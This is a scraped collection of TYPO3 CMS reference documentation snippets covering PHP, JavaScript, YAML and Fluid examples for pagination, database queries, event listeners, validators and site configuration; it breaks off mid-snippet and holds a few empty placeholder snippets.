Options\nDESCRIPTION: PHP implementation of an itemsProcFunc that dynamically populates a select field in a FlexForm configuration, demonstrating how to modify the items array in the configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\nclass ItemsProcFunc\n{\n     /**\n     * Modifies the select box of orderBy-options.\n     *\n     * @param array &$config configuration array\n     */\n    public function user_orderBy(array &$config)\n    {\n        // simple and stupid example\n        // change this to dynamically populate the list!\n        $config['items'] = [\n            // label, value\n            ['Timestamp', 'timestamp'],\n            ['Title', 'title']\n        ];\n    }\n\n    // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Array Pagination in Extbase Controller\nDESCRIPTION: Example of implementing the ArrayPaginator in an Extbase controller to paginate an array of items. The code shows how to initialize a paginator, create pagination configuration, and pass paginated results to a view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Pagination/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Core\\Pagination\\ArrayPaginator;\nuse TYPO3\\CMS\\Core\\Pagination\\SimplePagination;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass ExampleController extends ActionController\n{\n    public function paginateAction(int $currentPage = 1): ResponseInterface\n    {\n        // Just an example array. In a real scenario this would come from a repository\n        // or similar.\n        $itemsToBePaginated = range(1, 100);\n\n        // Initialize the paginator\n        $itemsPerPage = 10;\n        $paginator = new ArrayPaginator($itemsToBePaginated, $currentPage, $itemsPerPage);\n        $pagination = new SimplePagination($paginator);\n\n        $this->view->assignMultiple([\n            'paginator' => $paginator,\n            'pagination' => $pagination,\n        ]);\n        return $this->htmlResponse();\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Using Expression Builder CAST to VARCHAR in PHP\nDESCRIPTION: Shows how to use ExpressionBuilder::castVarchar() to convert a value, row field value or expression result to VARCHAR type with dynamic length.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Implementing a Message Handler in TYPO3\nDESCRIPTION: Example of a message handler class that processes DemoMessage objects. The handler uses the Symfony AsMessageHandler attribute to register itself for the specific message type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Queue\\Handler;\n\nuse MyVendor\\MyExtension\\Queue\\Message\\DemoMessage;\nuse Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler;\n\n#[AsMessageHandler]\nclass DemoHandler\n{\n    public function __invoke(DemoMessage $message): void\n    {\n        // Do something with the message\n        $payload = $message->getPayload();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using TYPO3 SessionStorage Wrapper in JavaScript\nDESCRIPTION: Example demonstrating how to use the TYPO3 SessionStorage wrapper to store and retrieve data. This module allows for persistent storage that is cleared when the browser session ends.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/SessionStorageWrapper.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n// Fetch the module\nrequire(['TYPO3/CMS/Core/Storage/BrowserSession'], function(BrowserSession) {\n\n    // Checks if 'myPreference' exists\n    if (BrowserSession.isset('myPreference')) {\n        // Get the stored value by key\n        var myPreference = BrowserSession.get('myPreference');\n        console.log(myPreference);\n\n        // Remove the stored value\n        BrowserSession.unset('myPreference');\n    }\n\n    // Store a value (a string, an object, ...)\n    BrowserSession.set('myPreference', { key: 'value' });\n\n    // Clear all stored values\n    BrowserSession.clear();\n});\n```\n\n----------------------------------------\n\nTITLE: Email Address Validation Using Extbase\nDESCRIPTION: The EmailAddressValidator uses the TYPO3 CMS core utility to ensure that an input is a valid email format, considering global TYPO3 configurations. Useful for fields where email validation is critical, such as user registration forms.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'EmailAddress'])]\nprotected string $email;\n```\n\n----------------------------------------\n\nTITLE: Instantiating a Flash Message in TYPO3 CMS\nDESCRIPTION: This snippet demonstrates how to create a new FlashMessage object in TYPO3 CMS. It shows the constructor parameters including message text, header, severity, and storage option.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/FlashMessagesApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Messaging\\FlashMessage;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Core\\Type\\ContextualFeedbackSeverity;\n\n// FlashMessage($message, $title = '', $severity = ContextualFeedbackSeverity::OK, $storeInSession = false)\n$message = GeneralUtility::makeInstance(FlashMessage::class,\n   'My message text',\n   'Message Header',\n   ContextualFeedbackSeverity::WARNING,\n   true\n);\n```\n\n----------------------------------------\n\nTITLE: Complete SELECT Query Example with TYPO3 Query Builder\nDESCRIPTION: Complete example of building and executing a SELECT query, including where conditions and fetching results.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$result = $queryBuilder\n    ->select('uid', 'header', 'bodytext')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR))\n    )\n    ->executeQuery();\n\nwhile ($row = $result->fetchAssociative()) {\n    // Do something with that single row\n    debug($row);\n}\n```\n\n----------------------------------------\n\nTITLE: Using ThrottleEvent Strategy in TYPO3 JavaScript Event API\nDESCRIPTION: Shows how to use the ThrottleEvent strategy which limits how often an event handler is called during continuous events. The example throttles scroll event handling to once every 100ms.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/EventApi/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nimport ThrottleEvent from '@typo3/core/event/throttle-event.js';\n\nnew ThrottleEvent('scroll', function(e) {\n  // Throttled event handling code\n}, 100).bindTo(window);\n```\n\n----------------------------------------\n\nTITLE: Creating New Record Link with Fluid ViewHelper\nDESCRIPTION: Shows how to create a new record link using typo3-backend-uri-newrecord ViewHelper in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/UriBuilder.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<f:link.typo3.uri.newRecord table=\"tx_examples_haiku\" pid=\"1\">\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Extension ext_localconf.php Skeleton\nDESCRIPTION: Basic structure for a TYPO3 extension's ext_localconf.php file, demonstrating the standard pattern for extension configuration and initialization\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtLocalconf.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\ndefined('TYPO3') or die();\n\n// Your extension configuration and initialization code here\n```\n\n----------------------------------------\n\nTITLE: Selecting a Single Row from tt_content Table in TYPO3\nDESCRIPTION: Shows how to fetch a single row from the tt_content table with default TCA restrictions applied. Demonstrates automatic handling of deleted, hidden, and time-based restrictions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/BasicCrud/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT `uid`, `pid`, `bodytext` FROM `tt_content` WHERE (`uid` = '4') AND ((`tt_content`.`deleted` = 0) AND (`tt_content`.`hidden` = 0) AND (`tt_content`.`starttime` <= 1669838885) AND ((`tt_content`.`endtime` = 0) OR (`tt_content`.`endtime` > 1669838885)))\n```\n\n----------------------------------------\n\nTITLE: Rendering Icons in Fluid Templates with ViewHelper\nDESCRIPTION: Examples of how to use the core:icon ViewHelper to render icons in Fluid templates. The snippet demonstrates both standard and inline SVG rendering approaches with size options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Icon/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n{namespace core = TYPO3\\CMS\\Core\\ViewHelpers}\n<core:icon identifier=\"tx-myext-svgicon\" size=\"small\" />\n```\n\nLANGUAGE: html\nCODE:\n```\n{namespace core = TYPO3\\CMS\\Core\\ViewHelpers}\n<core:icon\n    identifier=\"tx-myext-svgicon\"\n    size=\"small\"\n    alternativeMarkupIdentifier=\"inline\"\n/>\n```\n\n----------------------------------------\n\nTITLE: Bootstrapping the TYPO3 Backend\nDESCRIPTION: Example code that demonstrates how to bootstrap a TYPO3 backend application by initializing the class loader, setting up the system environment for a backend request, and running the backend application.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Bootstrapping.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// Set up the application for the backend\ncall_user_func(function () {\n    $classLoader = require dirname(__DIR__) . '/vendor/autoload.php';\n    \\TYPO3\\CMS\\Core\\Core\\SystemEnvironmentBuilder::run(1, \\TYPO3\\CMS\\Core\\Core\\SystemEnvironmentBuilder::REQUESTTYPE_BE);\n    \\TYPO3\\CMS\\Core\\Core\\Bootstrap::init($classLoader)->get(\\TYPO3\\CMS\\Backend\\Http\\Application::class)->run();\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyCacheLifetimeForPageEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement a listener for the ModifyCacheLifetimeForPageEvent. It limits the cache lifetime to 30 seconds in the development context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/ModifyCacheLifetimeForPageEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Context\\Context;\nuse TYPO3\\CMS\\Frontend\\Event\\ModifyCacheLifetimeForPageEvent;\n\nfinal class MyEventListener\n{\n    public function __construct(\n        private readonly Context $context,\n    ) {}\n\n    public function __invoke(ModifyCacheLifetimeForPageEvent $event): void\n    {\n        if ($this->context->getPropertyFromAspect('environment', 'applicationContext') === 'Development') {\n            $event->setCacheLifetime(30);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFileProcessingEvent Class in TYPO3 CMS\nDESCRIPTION: This code snippet defines the BeforeFileProcessingEvent class in TYPO3 CMS. It includes properties for the processing instruction, file object, and task type, along with getter and setter methods for these properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFileProcessingEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforeFileProcessingEvent\n{\n    private ProcessingInstruction $instruction;\n    private FileInterface $file;\n    private string $taskType;\n\n    public function __construct(ProcessingInstruction $instruction, FileInterface $file, string $taskType)\n    {\n        $this->instruction = $instruction;\n        $this->file = $file;\n        $this->taskType = $taskType;\n    }\n\n    public function getInstruction(): ProcessingInstruction\n    {\n        return $this->instruction;\n    }\n\n    public function getFile(): FileInterface\n    {\n        return $this->file;\n    }\n\n    public function getTaskType(): string\n    {\n        return $this->taskType;\n    }\n\n    public function setFile(FileInterface $file): void\n    {\n        $this->file = $file;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyDatabaseQueryForContentEvent Listener in TYPO3\nDESCRIPTION: An example event listener that demonstrates how to use the ModifyDatabaseQueryForContentEvent to filter out specific content elements from the Page module in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyDatabaseQueryForContentEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\View\\Event\\ModifyDatabaseQueryForContentEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyDatabaseQueryForContentEvent $event): void\n    {\n        $queryBuilder = $event->getQueryBuilder();\n\n        // Do not fetch CType \"my_special_content\"\n        $queryBuilder->andWhere(\n            $queryBuilder->expr()->neq('CType', $queryBuilder->createNamedParameter('my_special_content'))\n        );\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Complex Data Submission with DataHandler (PHP)\nDESCRIPTION: Shows handling of complex data submission including page creation and cache management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/UsingDataHandler/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\DataHandler;\\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\\n\\n$dataHandler = GeneralUtility::makeInstance(DataHandler::class);\\n$dataHandler->start(array_reverse($data), []);\\n$dataHandler->process_datamap();\\n\\n// Signal that the page tree should be updated\\n\\n// Clear cache for all pages\\n$dataHandler->clear_cacheCmd('pages');\n```\n\n----------------------------------------\n\nTITLE: Checking User Authentication with User Aspect in TYPO3 PHP\nDESCRIPTION: Shows how to use the User aspect to check if a frontend or backend user is logged in and retrieve user information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Context\\Context;\n\nclass MyController\n{\n    protected Context $context;\n\n    public function __construct(Context $context)\n    {\n        $this->context = $context;\n    }\n\n    public function myAction(): void\n    {\n        $frontendUserLoggedIn = $this->context->getPropertyFromAspect('frontend.user', 'isLoggedIn');\n        $backendUserLoggedIn = $this->context->getPropertyFromAspect('backend.user', 'isLoggedIn');\n\n        if ($frontendUserLoggedIn) {\n            $userId = $this->context->getPropertyFromAspect('frontend.user', 'id');\n            $username = $this->context->getPropertyFromAspect('frontend.user', 'username');\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using from() Method in QueryBuilder for TYPO3 CMS\nDESCRIPTION: Shows how to use the from() method in QueryBuilder for SELECT and COUNT queries. It demonstrates specifying the table name and optional alias.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_15\n\nLANGUAGE: PHP\nCODE:\n```\n// FROM `myTable`\n$queryBuilder->from('myTable');\n\n// FROM `myTable` AS `anAlias`\n$queryBuilder->from('myTable', 'anAlias');\n```\n\n----------------------------------------\n\nTITLE: Applying Multiple Validators to a Property in PHP\nDESCRIPTION: Example showing how to apply multiple validators (NotEmpty and StringLength) to a single nickname property.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_15\n\nLANGUAGE: php\nCODE:\n```\n#[Validate(['validator' => 'NotEmpty'])]\n#[Validate([\n    'validator' => 'StringLength',\n    'options' => ['minimum' => 3, 'maximum' => 20],\n])]\nprotected string $nickname;\n```\n\n----------------------------------------\n\nTITLE: Using GeneralUtility::makeInstance for Object Instantiation in PHP\nDESCRIPTION: Example of using TYPO3's GeneralUtility::makeInstance() method to create an object instance. This method allows for singleton implementation and XCLASSing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nGeneralUtility::makeInstance(\\MyVendor\\MyExtension\\Some\\Class::class)\n```\n\n----------------------------------------\n\nTITLE: Implementing Blog Model with InitializeObject Method in Extbase\nDESCRIPTION: This code demonstrates how to implement a Blog model with proper initialization using the initializeObject method, which is called during both construction and hydration in Extbase.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nnamespace MyVendor\\MyExtension\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Blog extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<\\MyVendor\\MyExtension\\Domain\\Model\\Post>\n     */\n    protected $posts;\n\n    public function __construct(string $title)\n    {\n        $this->title = $title;\n        $this->initializeObject();\n    }\n\n    /**\n     * Initializes all ObjectStorage properties\n     * Do not modify this method!\n     * It will be rewritten on each save in the extension builder\n     * You may modify the constructor of this class instead\n     */\n    public function initializeObject(): void\n    {\n        $this->posts = new ObjectStorage();\n    }\n\n    // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Site in YAML\nDESCRIPTION: This YAML configuration file defines the basic structure for a TYPO3 site. It includes settings for the site identifier, root page ID, website title, base URL, languages, error handling, and routing configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/Basics.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nrootPageId: 12\nbase: 'https://example.com'\nbaseVariants:\n  -\n    base: 'example.org'\n    condition: 'applicationContext == \"Production\"'\nlanguages:\n  -\n    title: English\n    enabled: true\n    languageId: '0'\n    base: /\n    typo3Language: default\n    locale: en_US.UTF-8\n    iso-639-1: en\n    navigationTitle: English\n    hreflang: en-US\n    direction: ltr\n    flag: us\n  -\n    title: Dansk\n    enabled: true\n    languageId: '1'\n    base: /da/\n    typo3Language: da\n    locale: da_DK.UTF-8\n    iso-639-1: da\n    navigationTitle: Dansk\n    hreflang: da-DK\n    direction: ltr\n    flag: dk\nerrorHandling:\n  -\n    errorCode: '404'\n    errorHandler: Page\n    errorContentSource: 't3://page?uid=8'\nroutes:\n  -\n    route: robots.txt\n    type: staticText\n    content: |\n      Sitemap: https://example.com/sitemap.xml\n      User-agent: *\n      Allow: /\n      Disallow: /forbidden/\nrouteEnhancers:\n  PageTypeSuffix:\n    type: PageType\n    default: ''\n    map:\n      'sitemap.xml': 1533906435\nwebsiteTitle: 'My TYPO3 site'\n```\n\n----------------------------------------\n\nTITLE: Github Actions Workflow Configuration for TYPO3 Styleguide (YAML)\nDESCRIPTION: YAML configuration for Github Actions CI/CD pipeline that automates testing for the TYPO3 Styleguide extension. It defines jobs that run on push, pull request, and daily schedule, executing composer validation, PHP linting, coding guidelines checks, PHPStan analysis, unit tests, and functional tests with multiple database systems.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\nname: tests\n\non:\n  push:\n  pull_request:\n  schedule:\n    - cron:  '42 5 * * *'\n\njobs:\n  testsuite:\n    name: all tests\n    runs-on: ubuntu-20.04\n    strategy:\n      # This prevents cancellation of matrix job runs, if one or more already failed\n      # and let the remaining matrix jobs be executed anyway.\n      fail-fast: false\n      matrix:\n        php: [ '8.1', '8.2' ]\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v3\n\n      - name: Install dependencies\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s composerUpdate\n\n      - name: Composer validate\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s composerValidate\n\n      - name: Lint PHP\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s lint\n\n      - name: CGL\n        run: Build/Scripts/runTests.sh -n -p ${{ matrix.php }} -s cgl\n\n      - name: phpstan\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s phpstan -e \"--error-format=github\"\n\n      - name: Unit Tests\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -s unit\n\n      - name: Functional Tests with mariadb and mysqli\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d mariadb -a mysqli -s functional\n\n      - name: Functional Tests with mariadb and pdo_mysql\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d mariadb -a pdo_mysql -s functional\n\n      - name: Functional Tests with mysql and mysqli\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d mysql -a mysqli -s functional\n\n      - name: Functional Tests with mysql and pdo_mysql\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d mysql -a pdo_mysql -s functional\n\n      - name: Functional Tests with postgres\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d postgres -s functional\n\n      - name: Functional Tests with sqlite\n        run: Build/Scripts/runTests.sh -p ${{ matrix.php }} -d sqlite -s functional\n\n      - name: Build CSS\n        run: Build/Scripts/runTests.sh -s buildCss\n```\n\n----------------------------------------\n\nTITLE: Error Handling in TYPO3 Ajax Requests (JavaScript)\nDESCRIPTION: Shows how to handle errors in TYPO3 Ajax requests. It includes both success and error handling functions in the then() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/AjaxRequest/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\npromise.then(\n  async (response) => {\n    const result = await response.resolve();\n    console.log(result);\n  },\n  (error) => {\n    console.error('Oops, an error occured', error);\n  }\n);\n```\n\n----------------------------------------\n\nTITLE: Using Expression Builder AS Clause in PHP\nDESCRIPTION: Shows how to use the ExpressionBuilder::as() method to append a field alias to a value, identifier or sub-expression.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Adding Broken Links to Repository in BeforeRecordIsAnalyzedEvent\nDESCRIPTION: This PHP code demonstrates how to add entries to the BrokenLinkRepository and the result set of BeforeRecordIsAnalyzedEvent when an external link to an internal page is found.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n$this->brokenLinkRepository->addBrokenLink(\n    [\n        'record_uid' => $uid,\n        'record_pid' => $event->getRecord()['pid'],\n        'page_uid' => $event->getRecord()['pid'],\n        'table_name' => $table,\n        'field' => $field,\n        'link_title' => substr($linkTitle, 0, 1024),\n        'link_type' => 'external',\n        'url' => $linkUrl,\n        'url_response' => @json_encode([\n            'valid' => false,\n            'statusCode' => 409,\n            'message' => 'External link pointing to local page',\n        ]),\n        'check_status' => 1,\n        'last_check' => $GLOBALS['EXEC_TIME'],\n        'link_last_check' => $GLOBALS['EXEC_TIME'],\n    ]\n);\n$event->getResults()[] = [\n    'errorParams' => [\n        'errorType' => 'external',\n        'message' => 'External link pointing to local page',\n        'url' => $linkUrl,\n    ],\n    'field' => $field,\n];\n```\n\n----------------------------------------\n\nTITLE: Defining AfterBackendPageRenderEvent Class in PHP\nDESCRIPTION: This snippet defines the AfterBackendPageRenderEvent class in the TYPO3\\CMS\\Backend\\Controller\\Event namespace. The class provides methods to get and set page content and access the view object after a backend page has been rendered.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterBackendPageRenderEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass AfterBackendPageRenderEvent\n{\n    public function getContent(): string\n    {\n        // Implementation not shown\n    }\n\n    public function setContent(string $content)\n    {\n        // Implementation not shown\n    }\n\n    public function getView(): \\TYPO3\\CMS\\Core\\View\\ViewInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Post Controller with Pagination in TYPO3 Extbase\nDESCRIPTION: This code snippet shows the PostController class from the BlogExample extension with an indexAction method that handles post listing with pagination. It includes functionality for filtering posts by blog and tag, forwarding to a blog view if no blog is selected, and implementing pagination with QueryResultPaginator and SimplePagination.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Controllers/ForwardAction.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse TYPO3\\CMS\\Core\\Pagination\\SimplePagination;\nuse TYPO3\\CMS\\Extbase\\Http\\ForwardResponse;\nuse TYPO3\\CMS\\Extbase\\Pagination\\QueryResultPaginator;\n\nclass PostController extends AbstractController\n{\n    /**\n     * Displays a list of posts. If $tag is set only posts matching this tag are shown\n     */\n    public function indexAction(\n        ?Blog $blog = null,\n        string $tag = '',\n        int $currentPage = 1,\n    ): ResponseInterface {\n        if ($blog == null) {\n            return (new ForwardResponse('index'))\n                ->withControllerName('Blog')\n                ->withExtensionName('blog_example')\n                ->withArguments(['currentPage' => $currentPage]);\n        }\n        $this->blogPageTitleProvider->setTitle($blog->getTitle());\n        if (empty($tag)) {\n            $posts = $this->postRepository->findBy(['blog' => $blog]);\n        } else {\n            $tag = urldecode($tag);\n            $posts = $this->postRepository->findByTagAndBlog($tag, $blog);\n            $this->view->assign('tag', $tag);\n        }\n        $paginator = new QueryResultPaginator(\n            $posts,\n            $currentPage,\n            (int)($this->settings['itemsPerPage'] ?? 3),\n        );\n        $pagination = new SimplePagination($paginator);\n        $this->view->assignMultiple([\n            'paginator' => $paginator,\n            'pagination' => $pagination,\n            'pages' => range(1, $pagination->getLastPageNumber()),\n            'blog' => $blog,\n            'posts' => $posts,\n        ]);\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Ajax Call in JavaScript\nDESCRIPTION: Creates a JavaScript function to make an Ajax call to the registered endpoint. Handles the response and logs the result to console.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Ajax.rst#2025-04-16_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst input = 8;\n\nfetch(TYPO3.settings.ajaxUrls.myextension_example_dosomething + '&input=' + input)\n    .then((response) => response.json())\n    .then((data) => {\n        console.log('8² = ' + data.result);\n    });\n```\n\n----------------------------------------\n\nTITLE: Checking application context using Environment class in TYPO3\nDESCRIPTION: This example demonstrates how to retrieve and check the current application context using the Environment class. The context may be Production, Testing, or Development with optional sub-contexts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Environment/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Core\\Environment;\n\n$applicationContext = Environment::getContext();\nif ($applicationContext->isProduction()) {\n   // do something only when in production context\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Middleware to Return an Unavailable Response in TYPO3\nDESCRIPTION: This middleware checks whether 'foo/bar' was requested and returns an unavailable response in that case. Otherwise, it passes control to the next middleware in the chain.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types = 1);\nnamespace MyVendor\\MyExtension\\Middleware;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\MiddlewareInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\nuse TYPO3\\CMS\\Core\\Http\\Response;\nuse 